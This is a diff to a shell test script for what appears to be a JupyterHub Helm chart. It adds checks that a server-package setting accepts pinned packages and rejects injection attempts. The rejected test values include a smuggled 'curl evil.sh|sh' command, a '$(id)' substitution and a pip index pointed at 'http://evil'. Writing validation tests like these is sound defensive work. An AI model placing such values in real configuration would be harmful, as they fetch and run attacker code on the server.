@@ -210,4 +210,11 @@ grep -q 'OAUTH2_PROXY_EMAIL_DOMAINS, value: "acme.io"' <<<"$(out="$og" doc Deplo
 grep -q 'OAUTH2_PROXY_CODE_CHALLENGE_METHOD, value: "S256"' <<<"$(out="$og" doc Deployment nb1-notebooks-auth)" || fail "new google: PKCE"
 grep -q 'OAUTH2_PROXY_CODE_CHALLENGE_METHOD' <<<"$dep" && fail "new github: no PKCE (GitHub OAuth apps)"
 rm -f "$px"
+# --- packages installed at server start (custom.serverPackages), 0.1.4 ---
+render --set-string 'jupyterhub.custom.serverPackages=s3fs==2026.9.0 boto3==1.43.106 mlflow-skinny==3.17.1' >/dev/null || fail "serverPackages: pins accepted"
+render --set-string 'jupyterhub.custom.serverPackages=pkg[extra]==1.0  other' >/dev/null || fail "serverPackages: extras and double spaces accepted"
+refused --set-string 'jupyterhub.custom.serverPackages=s3fs;curl evil.sh|sh'
+refused --set-string 'jupyterhub.custom.serverPackages=$(id)'
+refused --set-string 'jupyterhub.custom.serverPackages=boto3>=1.0'
+refused --set-string 'jupyterhub.custom.serverPackages=--index-url=http://evil'
 echo "PASS"
